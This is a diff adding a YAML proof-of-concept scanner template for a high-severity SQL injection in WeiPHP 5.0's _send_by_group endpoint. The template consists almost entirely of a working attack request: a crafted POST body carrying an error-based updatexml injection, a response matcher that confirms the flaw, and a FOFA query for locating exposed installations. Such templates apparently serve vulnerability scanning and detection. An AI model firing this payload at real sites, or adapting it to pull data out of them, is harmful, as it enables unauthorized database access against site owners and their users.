@@ -1,0 +1,23 @@
+id: poc-yaml-weiphp5-send-by-group-sqli
+info:
+  name: WeiPHP5.0 _send_by_group SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: WeiPHP
+  fofa: app="WeiPHP"
+requests:
+- method: POST
+  path: /public/index.php/weixin/message/_send_by_group
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+md5%28{{.random}}%29%29%2C0x7e%29%2C1%29+--
+  expression: 'status_code == 500 &&
+
+    contains(body,t1)
+
+    '
+variables:
+  random: random_int(1000,9999)
+  t1: md5(random)
+transport: http
